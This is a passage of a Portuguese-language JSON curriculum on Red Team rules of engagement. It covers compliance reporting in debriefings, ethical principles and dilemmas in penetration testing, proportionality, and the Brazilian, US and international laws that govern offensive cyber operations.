                                    "Acessar o documento oficial das ROE aplicáveis à operação cibernética.",
                                    "Coletar todos os logs de atividade do Red Team, incluindo timestamps, ações executadas e ferramentas usadas.",
                                    "Identificar eventos chave da operação que possam envolver ROE, como acessos a sistemas ou interações com alvos.",
                                    "Organizar os logs cronologicamente e anotar referências preliminares às ROE relevantes.",
                                    "Verificar integridade dos logs para evitar dados corrompidos ou incompletos."
                                  ],
                                  "verification": "Lista completa de ROE revisadas e logs coletados com anotações iniciais e timestamps confirmados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documento oficial de ROE",
                                    "Logs de operação (arquivos .log ou ferramentas como ELK Stack)",
                                    "Editor de texto ou planilha (ex: Excel, Notion)"
                                  ],
                                  "tips": "Use filtros em ferramentas de log para focar em eventos críticos e evite sobrecarga de dados irrelevantes.",
                                  "learningObjective": "Compreender as ROE específicas e reunir evidências factuais da operação para análise posterior.",
                                  "commonMistakes": [
                                    "Ignorar ROE secundárias ou contextuais",
                                    "Não validar a integridade dos logs",
                                    "Misturar logs de diferentes fontes sem rotulagem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Conformidade com as ROE",
                                  "subSteps": [
                                    "Mapear cada ação do Red Team nos logs contra as cláusulas específicas das ROE.",
                                    "Classificar ações como 'conforme', 'não conforme' ou 'limite' com justificativa e evidências.",
                                    "Identificar desvios potenciais, incluindo violações acidentais ou ambiguidades nas ROE.",
                                    "Documentar impactos de ações conformes e não conformes na operação.",
                                    "Consultar membros da equipe para esclarecimentos sobre ações ambíguas."
                                  ],
                                  "verification": "Tabela ou matriz de análise com todas ações mapeadas, classificadas e justificadas com citações de logs e ROE.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Matriz de análise (planilha Excel ou Google Sheets)",
                                    "Logs anotados do Step 1",
                                    "Documento ROE"
                                  ],
                                  "tips": "Use cores na matriz para visualização rápida: verde para conforme, vermelho para não conforme.",
                                  "learningObjective": "Desenvolver habilidade em identificar e justificar adesão ou desvios às ROE com base em evidências.",
                                  "commonMistakes": [
                                    "Classificações subjetivas sem evidências",
                                    "Omitir ações em 'limite'",
                                    "Não considerar contexto operacional"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Documentar Achados e Extrair Lições Aprendidas",
                                  "subSteps": [
                                    "Redigir seção de conformidade resumindo achados da análise, com evidências citadas.",
                                    "Listar lições aprendidas, incluindo melhorias para ROE, processos ou treinamento.",
                                    "Incluir recomendações para iterações futuras de jogos cibernéticos.",
                                    "Revisar o draft para clareza, precisão e neutralidade.",
                                    "Adicionar anexos com logs selecionados e matriz de análise."
                                  ],
                                  "verification": "Draft do relatório completo com seções de conformidade, lições e recomendações revisado por pares.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de relatório de debriefing",
                                    "Ferramenta de edição (Word, Google Docs)",
                                    "Matriz de análise do Step 2"
                                  ],
                                  "tips": "Estruture com headings claros e bullet points para facilitar leitura no debriefing.",
                                  "learningObjective": "Capacitar na redação de relatórios objetivos que promovam melhoria contínua.",
                                  "commonMistakes": [
                                    "Relatório vago sem evidências",
                                    "Foco excessivo em culpas em vez de lições",
                                    "Exceder limite de páginas sem priorização"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Preparar e Apresentar no Debriefing do Red Team",
                                  "subSteps": [
                                    "Preparar slides ou resumo visual do relatório para apresentação.",
                                    "Simular a apresentação para timing e clareza.",
                                    "Apresentar no debriefing, respondendo perguntas e discutindo lições.",
                                    "Coletar feedback da equipe e registrar atualizações no relatório final.",
                                    "Arquivar o relatório final para referência futura."
                                  ],
                                  "verification": "Relatório final apresentado, feedback coletado e arquivado com confirmação da equipe.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de apresentação (PowerPoint, Google Slides)",
                                    "Relatório draft do Step 3",
                                    "Gravação de áudio/vídeo para autoavaliação"
                                  ],
                                  "tips": "Pratique respostas para perguntas comuns sobre desvios para demonstrar proatividade.",
                                  "learningObjective": "Dominar comunicação de conformidade ROE em contextos de equipe para fomentar accountability.",
                                  "commonMistakes": [
                                    "Apresentação monótona ou técnica demais",
                                    "Ignorar feedback",
                                    "Não arquivar versão final"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético simulando ataque a uma infraestrutura crítica, revisar logs de um spear-phishing que respeitou ROE ao evitar alvos civis; documentar conformidade total, mas lição aprendida: adicionar treinamento em detecção de ambiguidades em ROE para cenários dinâmicos.",
                              "finalVerifications": [
                                "Relatório completo gerado com evidências de todos os eventos chave.",
                                "100% das ações analisadas mapeadas às ROE com classificações justificadas.",
                                "Pelo menos 3 lições aprendidas identificadas e recomendadas.",
                                "Apresentação realizada com feedback positivo da equipe.",
                                "Relatório arquivado e acessível para iterações futuras.",
                                "Nenhuma inconsistência factual detectada em revisão final."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na análise de conformidade (90%+ ações cobertas).",
                                "Clareza e estrutura do relatório (fácil leitura e compreensão).",
                                "Qualidade das lições aprendidas (acionáveis e relevantes).",
                                "Evidências citadas de forma consistente e verificável.",
                                "Eficácia da apresentação (engajamento da equipe e respostas a perguntas).",
                                "Profundidade na identificação de ambiguidades ou melhorias em ROE."
                              ],
                              "crossCurricularConnections": [
                                "Comunicação Técnica: Redação e apresentação de relatórios.",
                                "Análise de Dados: Processamento e mapeamento de logs.",
                                "Ética Profissional: Accountability em operações sensíveis.",
                                "Gestão de Projetos: Lições aprendidas para iterações.",
                                "Liderança: Facilitação de debriefings em equipe."
                              ],
                              "realWorldApplication": "Em equipes profissionais de Red Team de cibersegurança, como em consultorias ou agências governamentais, relatar conformidade ROE em debriefings assegura conformidade legal, mitiga riscos e otimiza táticas para operações reais de teste de penetração."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.4",
                    "name": "Aspectos Éticos das Regras de Engajamento",
                    "description": "Princípios éticos e legais aplicados às ROE em contextos de Red Team.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.4.1",
                        "name": "Princípios Éticos Fundamentais em Operações de Red Team",
                        "description": "Exploração dos princípios éticos basilares que regem as ações do Red Team, enfatizando a minimização de danos, transparência e responsabilidade em simulações cibernéticas.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.1.1",
                            "name": "Identificar os princípios éticos do código de conduta do Red Team",
                            "description": "Reconhecer e descrever princípios como 'não causar dano colateral real', 'obter autorização explícita' e 'manter confidencialidade', com base em referências como o guia de VEST e TUBBERVILLE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar os Princípios Éticos Fundamentais do Red Team",
                                  "subSteps": [
                                    "Acesse documentos oficiais sobre códigos de conduta de Red Team, como o guia VEST e TUBBERVILLE.",
                                    "Identifique os princípios principais: não causar dano colateral real, obter autorização explícita e manter confidencialidade.",
                                    "Anote definições iniciais para cada princípio em suas próprias palavras.",
                                    "Compare com exemplos de violações em relatórios públicos de incidentes éticos.",
                                    "Crie um glossário pessoal com termos chave como 'dano colateral' e 'autorização explícita'."
                                  ],
                                  "verification": "Verifique se o glossário lista pelo menos os três princípios principais com definições claras.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Guia VEST (PDF ou site oficial)",
                                    "Guia TUBBERVILLE",
                                    "Notebook ou documento digital para anotações"
                                  ],
                                  "tips": "Comece pelo índice dos guias para localizar seções de ética rapidamente.",
                                  "learningObjective": "Compreender a origem e lista dos princípios éticos fundamentais em operações de Red Team.",
                                  "commonMistakes": [
                                    "Confundir princípios éticos com regras técnicas de segurança.",
                                    "Ignorar contexto legal nos guias."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever Detalhadamente Cada Princípio Ético",
                                  "subSteps": [
                                    "Para 'não causar dano colateral real': Explique o que constitui dano (físico, financeiro, reputacional) e exceções permitidas.",
                                    "Para 'obter autorização explícita': Detalhe o processo de RoE (Rules of Engagement) e consentimento escrito.",
                                    "Para 'manter confidencialidade': Descreva obrigações de NDA e relatórios anonimizados.",
                                    "Inclua exemplos hipotéticos de conformidade e não-conformidade para cada um.",
                                    "Relacione cada princípio com impactos em stakeholders (alvo, equipe azul, sociedade)."
                                  ],
                                  "verification": "Crie cartões de estudo com descrição, exemplo e impacto para cada princípio; revise até memorizar.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Cartões de estudo (físicos ou app como Anki)",
                                    "Guias VEST e TUBBERVILLE abertos"
                                  ],
                                  "tips": "Use bullet points para descrições curtas e impactantes.",
                                  "learningObjective": "Capacitar-se a descrever com precisão os princípios éticos e suas implicações.",
                                  "commonMistakes": [
                                    "Generalizar demais sem exemplos concretos.",
                                    "Omitir exceções raras definidas nos guias."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Princípios a Referências e Casos Reais",
                                  "subSteps": [
                                    "Localize citações exatas nos guias VEST e TUBBERVILLE para cada princípio.",
                                    "Pesquise casos públicos de Red Team (ex: relatórios MITRE ou DEF CON) que ilustrem aplicação.",
                                    "Crie uma tabela comparativa: Princípio | Referência | Exemplo de Caso.",
                                    "Analise como violações afetaram carreiras ou projetos.",
                                    "Discuta em fórum ou com mentor para validar mapeamento."
                                  ],
                                  "verification": "A tabela deve ter pelo menos 3 entradas completas; compartilhe para feedback.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Internet para casos públicos",
                                    "Planilha (Google Sheets ou Excel)",
                                    "Guias oficiais"
                                  ],
                                  "tips": "Use Ctrl+F nos PDFs para buscas rápidas por palavras-chave como 'dano colateral'.",
                                  "learningObjective": "Conectar teoria ética a referências autoritativas e prática real.",
                                  "commonMistakes": [
                                    "Usar fontes não oficiais como Wikipedia.",
                                    "Ignorar atualizações recentes nos guias."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Princípios em Cenários Simulados",
                                  "subSteps": [
                                    "Crie 3 cenários hipotéticos de operações Red Team (ex: simulação de phishing).",
                                    "Para cada um, identifique quais princípios se aplicam e como garanti-los.",
                                    "Simule uma revisão de RoE e marque violações potenciais.",
                                    "Redija um relatório ético curto justificando decisões.",
                                    "Autoavalie usando checklist dos princípios."
                                  ],
                                  "verification": "Relatório simulado cobre todos os princípios sem violações identificadas incorretamente.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Papel ou editor de texto para cenários",
                                    "Checklist impresso dos princípios"
                                  ],
                                  "tips": "Torne cenários realistas baseados em notícias de cibersegurança.",
                                  "learningObjective": "Desenvolver habilidade de identificar princípios em contextos operacionais.",
                                  "commonMistakes": [
                                    "Focar só em sucesso técnico, ignorando ética.",
                                    "Criar cenários muito simples sem dilemas éticos."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team contra uma rede corporativa autorizada, o time identifica uma vulnerabilidade que poderia expor dados de clientes reais. Aplicando 'não causar dano colateral real', eles param a exploração, notificam via RoE e recomendam patches, obtendo elogios por ética em vez de relatório de exploits perigosos.",
                              "finalVerifications": [
                                "Pode listar e definir os três princípios principais sem consultar materiais?",
                                "Identifica corretamente violações em 3 cenários hipotéticos?",
                                "Cita referências específicas de VEST ou TUBBERVILLE para cada princípio?",
                                "Explica impactos de violações em stakeholders?",
                                "Cria um checklist pessoal para auditoria ética em operações?"
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições (90% alinhado com guias oficiais)",
                                "Profundidade de exemplos e mapeamentos (mínimo 3 por princípio)",
                                "Capacidade de aplicação em cenários (sem erros em simulações)",
                                "Uso correto de referências (citações exatas)",
                                "Clareza e estrutura nas descrições e relatórios"
                              ],
                              "crossCurricularConnections": [
                                "Ética Filosófica: Comparação com princípios kantianos de dever.",
                                "Direito Cibernético: Relação com leis como CFAA e GDPR.",
                                "Gestão de Riscos: Integração em frameworks como NIST RMF.",
                                "Psicologia Organizacional: Impacto na confiança em equipes de segurança."
                              ],
                              "realWorldApplication": "Durante uma operação de pentest contratada, o profissional Red Team usa esses princípios para rejeitar uma tática de DoS que causaria downtime real, preservando a relação com o cliente e evitando litígios, resultando em contratos recorrentes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.2",
                            "name": "Analisar dilemas éticos comuns em testes de penetração",
                            "description": "Examinar cenários hipotéticos onde ações ofensivas podem violar ética, como acesso não autorizado a dados sensíveis, e discutir resoluções baseadas em mindset do adversário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Princípios Éticos Fundamentais em Testes de Penetração",
                                  "subSteps": [
                                    "Estude o Código de Ética da EC-Council ou CREST para pentests.",
                                    "Identifique os quatro pilares éticos: confidencialidade, integridade, disponibilidade e legalidade.",
                                    "Analise regras de engajamento (RoE) padrão em contratos de pentest.",
                                    "Liste obrigações do red teamer, como obter autorização escrita.",
                                    "Compare ética em pentest com mindset do adversário (black hat)."
                                  ],
                                  "verification": "Crie um resumo de 1 página listando 5 princípios chave e cite fontes.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Código de Ética EC-Council (PDF)",
                                    "Contrato de pentest modelo",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use mnemônicos como 'CIDA' para lembrar confidencialidade, integridade, disponibilidade e accountability.",
                                  "learningObjective": "Compreender os fundamentos éticos que guiam ações em pentests.",
                                  "commonMistakes": [
                                    "Ignorar diferenças entre simulação e crime real",
                                    "Confundir autorização com permissão implícita"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Dilemas Éticos Comuns em Cenários de Pentest",
                                  "subSteps": [
                                    "Liste 5 dilemas comuns: acesso não autorizado a dados sensíveis, escalada de privilégios acidental, exposição de vulnerabilidades de terceiros.",
                                    "Classifique cada dilema por risco ético (baixo, médio, alto).",
                                    "Pesquise casos reais anonimizados (ex: relatórios OWASP).",
                                    "Mapeie dilemas ao mindset do adversário: o que um hacker faria vs. o que um pentester deve fazer.",
                                    "Documente triggers que levam a dilemas, como escopo mal definido."
                                  ],
                                  "verification": "Produza uma tabela com 5 dilemas, classificações e exemplos breves.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "OWASP Ethical Hacking Guide",
                                    "Relatórios de pentest públicos (redigidos)",
                                    "Planilha Excel ou Google Sheets"
                                  ],
                                  "tips": "Priorize dilemas baseados em frequência em incidentes reais para relevância.",
                                  "learningObjective": "Reconhecer padrões de dilemas éticos recorrentes em operações ofensivas.",
                                  "commonMistakes": [
                                    "Subestimar impactos indiretos como vazamento de PII",
                                    "Focar só em aspectos técnicos, ignorando humanos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Cenários Hipotéticos Detalhados",
                                  "subSteps": [
                                    "Selecione 3 cenários hipotéticos: (1) Encontrar dados médicos durante scan; (2) Exploit que afeta produção; (3) Descoberta de backdoor de insider.",
                                    "Para cada um, descreve ações ofensivas possíveis e violações éticas potenciais.",
                                    "Aplique framework de análise: Quem é afetado? Qual o dano? Há autorização?",
                                    "Simule mindset do adversário: 'Explorar tudo' vs. 'Parar e reportar'.",
                                    "Debata prós/contras de continuar vs. pausar."
                                  ],
                                  "verification": "Escreva análises de 200 palavras por cenário, destacando pontos éticos críticos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de simulação como HackTheBox (modo free)",
                                    "Templates de análise ética",
                                    "Vídeos de estudos de caso éticos"
                                  ],
                                  "tips": "Use o método STAR (Situação, Tarefa, Ação, Resultado) para estruturar análises.",
                                  "learningObjective": "Desenvolver habilidade de dissecar dilemas em componentes acionáveis.",
                                  "commonMistakes": [
                                    "Justificar violações com 'é só teste'",
                                    "Não considerar perspectivas de stakeholders não técnicos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver e Discutir Resoluções Éticas Baseadas em Mindset do Adversário",
                                  "subSteps": [
                                    "Para cada cenário analisado, proponha 2-3 resoluções éticas (ex: notificar imediatamente, expandir RoE).",
                                    "Incorpore mindset do adversário para prever riscos não éticos.",
                                    "Crie um checklist de decisão ética para uso em campo.",
                                    "Simule role-play: discuta com parceiro ou grave áudio debatendo uma resolução.",
                                    "Documente lições aprendidas e atualizações para RoE futuras."
                                  ],
                                  "verification": "Gere um checklist de 10 itens e role-play gravado de 5 minutos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Checklist template (Word/Google Docs)",
                                    "Gravador de áudio ou parceiro de estudo",
                                    "RoE modelo editável"
                                  ],
                                  "tips": "Sempre priorize 'faça o mínimo dano' e documente tudo para CYA (Cover Your Ass).",
                                  "learningObjective": "Formular respostas éticas proativas e defensáveis.",
                                  "commonMistakes": [
                                    "Escolher resoluções rápidas sem consulta",
                                    "Ignorar lições de mindset adversário para prevenção"
                                  ]
                                }
                              ],
                              "practicalExample": "Durante um pentest em uma clínica, você explora uma vulnerabilidade web e acessa acidentalmente registros médicos de pacientes (PII). Em vez de prosseguir, pause, isole os dados, notifique o cliente por canal seguro e atualize o RoE antes de continuar, contrastando com um adversário que venderia os dados na dark web.",
                              "finalVerifications": [
                                "Identificar corretamente 5 dilemas éticos em um novo cenário hipotético.",
                                "Aplicar checklist de decisão em simulação sem violações.",
                                "Explicar diferenças entre mindset pentester e adversário em entrevista.",
                                "Produzir relatório ético conciso para um caso dado.",
                                "Debater resoluções com argumentos baseados em códigos éticos.",
                                "Listar 3 conexões com leis como GDPR ou HIPAA."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na identificação de dilemas (cobertura de impactos múltiplos).",
                                "Precisão na aplicação de princípios éticos e RoE.",
                                "Criatividade e viabilidade nas resoluções propostas.",
                                "Integração do mindset do adversário na análise.",
                                "Clareza e estrutura na documentação (checklists, relatórios).",
                                "Evidência de reflexão crítica sobre erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Filosofia: Teorias éticas (utilitarismo vs. deontologia em decisões cibernéticas).",
                                "Direito: Legislação de cibersegurança (LGPD, GDPR, CFAA).",
                                "Psicologia: Viés cognitivo em julgamentos éticos sob pressão.",
                                "Gestão de Projetos: Gerenciamento de escopo e riscos em RoE.",
                                "Comunicação: Redação de relatórios éticos persuasivos."
                              ],
                              "realWorldApplication": "Em um pentest real para um banco, ao descobrir acesso a contas de clientes, o analista usa essa análise para pausar, reportar via canal dedicado, renegociar escopo e incluir na recomendação final, evitando litígios e fortalecendo confiança do cliente."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.3",
                            "name": "Aplicar o princípio de proporcionalidade ética nas ROE",
                            "description": "Avaliar como equilibrar a simulação de ataques reais com a proporcionalidade para evitar impactos desnecessários em ambientes de produção simulados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Princípio de Proporcionalidade Ética",
                                  "subSteps": [
                                    "Estude definições formais de proporcionalidade em contextos éticos e militares (ex: Convenção de Genebra adaptada para ciber).",
                                    "Analise exemplos históricos de desproporcionalidade em operações cibernéticas (ex: Stuxnet).",
                                    "Identifique os quatro pilares: necessidade, distinção, proporcionalidade e humanidade.",
                                    "Discuta com pares como isso se aplica a ROE em simulações de red team.",
                                    "Resuma em um mapa mental os elementos chave."
                                  ],
                                  "verification": "Criar um resumo de 1 página explicando o princípio com 3 exemplos cibernéticos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos éticos da NIST SP 800-53",
                                    "Artigos sobre ética cibernética",
                                    "Mapa mental tool (ex: MindMeister)"
                                  ],
                                  "tips": "Foquem em analogias militares para facilitar compreensão em cenários cibernéticos.",
                                  "learningObjective": "Definir e exemplificar proporcionalidade ética em operações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir com legalidade, ignorando aspectos morais.",
                                    "Subestimar impactos colaterais em simulações."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar ROE Existentes sob Lente de Proporcionalidade",
                                  "subSteps": [
                                    "Revise ROE de exercícios passados ou templates padrão para operações de red team.",
                                    "Identifique cláusulas relacionadas a escopo, intensidade e limites de impacto.",
                                    "Classifique ações simuladas (ex: DDoS leve vs. full) por nível de proporcionalidade.",
                                    "Marque gaps onde proporcionalidade não é explicitada.",
                                    "Compare com frameworks como MITRE ATT&CK para mapeamento de táticas."
                                  ],
                                  "verification": "Produzir relatório anotado de ROE com destaques de riscos desproporcionais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Templates de ROE",
                                    "MITRE ATT&CK framework",
                                    "Ferramenta de edição de PDF"
                                  ],
                                  "tips": "Use cores para marcar: verde (proporcional), amarelo (questionável), vermelho (desproporcional).",
                                  "learningObjective": "Avaliar ROE quanto à incorporação de proporcionalidade ética.",
                                  "commonMistakes": [
                                    "Ignorar contextos simulados vs. reais.",
                                    "Focar só em técnica, ignorando ética."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar Cenários de Simulação de Ataques",
                                  "subSteps": [
                                    "Selecione 3 cenários de ataque realista (ex: phishing, exploit, DoS).",
                                    "Modele impactos potenciais em ambiente simulado (ex: VM com dados fictícios).",
                                    "Calcule 'custo-benefício' ético: ganho de aprendizado vs. risco de dano.",
                                    "Priorize ações proporcionais usando matriz de decisão (risco/necessidade).",
                                    "Simule um cenário em ferramenta virtual para validar avaliação."
                                  ],
                                  "verification": "Criar matriz de decisão para 3 cenários com scores de proporcionalidade.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de simulação (ex: Cyber Range, VirtualBox)",
                                    "Matriz Excel template"
                                  ],
                                  "tips": "Sempre pergunte: 'Isso é necessário para o objetivo de treinamento?'",
                                  "learningObjective": "Equilibrar realismo de ataques com limites éticos proporcionais.",
                                  "commonMistakes": [
                                    "Superestimar realismo sem considerar recuperação.",
                                    "Não envolver stakeholders éticos cedo."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver e Integrar Cláusulas de Proporcionalidade nas ROE",
                                  "subSteps": [
                                    "Redija cláusulas específicas: limites de tráfego, duração, notificação prévia.",
                                    "Inclua triggers de escalada/desengajamento baseados em thresholds éticos.",
                                    "Revise com equipe multidisciplinar (técnica, legal, ética).",
                                    "Teste cláusulas em walkthrough de cenário.",
                                    "Finalize ROE atualizadas com sign-off."
                                  ],
                                  "verification": "ROE revisada aprovada por pelo menos 2 revisores.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Template de ROE editável",
                                    "Checklist ética"
                                  ],
                                  "tips": "Use linguagem clara e mensurável (ex: 'tráfego <10% capacidade').",
                                  "learningObjective": "Incorporar proporcionalidade em ROE acionáveis.",
                                  "commonMistakes": [
                                    "Cláusulas vagas sem métricas.",
                                    "Ignorar feedback de não-técnicos."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Iterar Aplicação em Simulação",
                                  "subSteps": [
                                    "Execute simulação curta usando ROE atualizadas.",
                                    "Monitore métricas de impacto em tempo real.",
                                    "Registre desvios e ajustes feitos por proporcionalidade.",
                                    "Realize debriefing focado em ética.",
                                    "Atualize ROE baseado em lições aprendidas."
                                  ],
                                  "verification": "Relatório pós-simulação com métricas de conformidade ética >90%.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente de simulação",
                                    "Ferramentas de monitoramento (ex: Wireshark, SIEM simulado)"
                                  ],
                                  "tips": "Tenha 'kill switch' sempre pronto para desengajamento imediato.",
                                  "learningObjective": "Validar aplicação prática do princípio em exercícios.",
                                  "commonMistakes": [
                                    "Não monitorar em tempo real.",
                                    "Pular debriefing ético."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando um ataque a uma rede bancária fictícia, aplicar proporcionalidade ao limitar um teste de DDoS a 5 minutos e 20% da capacidade da VM, evitando sobrecarga que simulasse downtime real, enquanto ainda treina detecção e mitigação.",
                              "finalVerifications": [
                                "ROE inclui cláusulas mensuráveis de proporcionalidade com thresholds claros.",
                                "Simulação executada sem incidentes desproporcionais reportados.",
                                "Equipe pode explicar decisões éticas em debriefing.",
                                "Matriz de avaliação mostra todos cenários como proporcionais.",
                                "Documentação atualizada e aprovada por stakeholders.",
                                "Métricas de impacto < limites pré-definidos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e aplicação do princípio (90%+ acurácia).",
                                "Qualidade das cláusulas ROE: claras, mensuráveis e éticas.",
                                "Efetividade na simulação: equilíbrio realismo vs. segurança.",
                                "Profundidade de análise de riscos colaterais.",
                                "Capacidade de iterar baseado em feedback.",
                                "Integração com outros princípios éticos (ex: distinção)."
                              ],
                              "crossCurricularConnections": [
                                "Ética Filosófica: Teorias de guerra justa (jus in bello).",
                                "Direito Internacional: Convenções de Genebra e Tallinn Manual.",
                                "Gerenciamento de Riscos: Frameworks como ISO 31000 adaptados a ciber.",
                                "Liderança e Tomada de Decisão: Análise custo-benefício ética."
                              ],
                              "realWorldApplication": "Durante pentests autorizados em empresas, aplicar proporcionalidade para simular breaches sem causar interrupções reais em produção, como testar exploits em staging environments com rollbacks automáticos, garantindo conformidade regulatória e preservação de confiança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.2",
                        "name": "Quadro Legal Aplicável às Regras de Engajamento (ROE)",
                        "description": "Análise das bases legais que sustentam as ROE em contextos de Red Team, incluindo leis nacionais e internacionais de cibersegurança.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.2.1",
                            "name": "Mapear legislações relevantes para operações cibernéticas ofensivas",
                            "description": "Estudar leis como a LGPD no Brasil, CFAA nos EUA e convenções internacionais, relacionando-as às restrições das ROE em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar legislações nacionais brasileiras relevantes",
                                  "subSteps": [
                                    "Acessar o site oficial do Planalto para ler a Lei Geral de Proteção de Dados (LGPD - Lei 13.709/2018)",
                                    "Identificar artigos chave sobre tratamento de dados pessoais, sanções por violações e aplicação a ciberataques",
                                    "Estudar o Marco Civil da Internet (Lei 12.965/2014) focando em neutralidade de rede e responsabilidade por conteúdo",
                                    "Analisar leis penais como o Código Penal (arts. 154-A sobre invasão de dispositivo) e crimes cibernéticos",
                                    "Compilar resumo das restrições a operações ofensivas cibernéticas"
                                  ],
                                  "verification": "Documento com resumo de 1-2 páginas listando leis, artigos relevantes e restrições específicas",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "Site www.planalto.gov.br",
                                    "Notebook ou computador",
                                    "Ferramenta de notas (ex: Google Docs ou Notion)"
                                  ],
                                  "tips": "Priorize leis com sanções penais e civis diretamente ligadas a acessos não autorizados e manipulação de dados.",
                                  "learningObjective": "Compreender o quadro legal brasileiro que limita operações cibernéticas ofensivas envolvendo dados e infraestruturas nacionais.",
                                  "commonMistakes": [
                                    "Ignorar atualizações ou projetos de lei complementares à LGPD",
                                    "Confundir proteção de dados com mera privacidade pessoal, sem foco em cibersegurança"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar legislações dos EUA e principais restrições",
                                  "subSteps": [
                                    "Acessar o site do Departamento de Justiça dos EUA para ler o Computer Fraud and Abuse Act (CFAA - 18 U.S.C. § 1030)",
                                    "Analisar seções sobre acesso não autorizado, danos a sistemas protegidos e extraterritorialidade",
                                    "Pesquisar Executive Order 13694 sobre cibersegurança e sanções por ataques cibernéticos",
                                    "Revisar casos judiciais famosos envolvendo CFAA em operações cibernéticas (ex: Aaron Swartz case)",
                                    "Mapear como essas leis se aplicam a atores estrangeiros em cenários ofensivos"
                                  ],
                                  "verification": "Tabela comparativa com CFAA vs. leis brasileiras, destacando similaridades em restrições",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "Site www.justice.gov",
                                    "Documentos PDF das leis",
                                    "Ferramenta de tabelas (ex: Excel ou Google Sheets)"
                                  ],
                                  "tips": "Note a amplitude extraterritorial do CFAA, que pode afetar operações contra alvos americanos mesmo de fora dos EUA.",
                                  "learningObjective": "Identificar paralelos e diferenças entre legislações americanas e brasileiras em ciberoperações ofensivas.",
                                  "commonMistakes": [
                                    "Subestimar a interpretação judicial ampla do 'acesso não autorizado' no CFAA",
                                    "Não considerar implicações para aliados dos EUA em exercícios conjuntos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar convenções e normas internacionais",
                                  "subSteps": [
                                    "Estudar a Convenção de Budapeste sobre Cibercrime (2001) e sua ratificação pelo Brasil",
                                    "Ler o Tallinn Manual 2.0 sobre Direito Internacional Aplicável a Operações Cibernéticas",
                                    "Revisar resoluções da ONU sobre cibersegurança (ex: GGE reports) e normas de soberania cibernética",
                                    "Identificar princípios como não-interferência e proibição de uso da força em cyber ops",
                                    "Compilar impactos em operações ofensivas transfronteiriças"
                                  ],
                                  "verification": "Mapa mental ou diagrama conectando convenções a restrições operacionais",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "Site do Conselho da Europa (Convenção de Budapeste)",
                                    "PDF do Tallinn Manual (disponível online)",
                                    "Ferramenta de mind mapping (ex: MindMeister ou papel)"
                                  ],
                                  "tips": "Foque no Tallinn Manual como 'soft law' influente para ROE em jogos de guerra.",
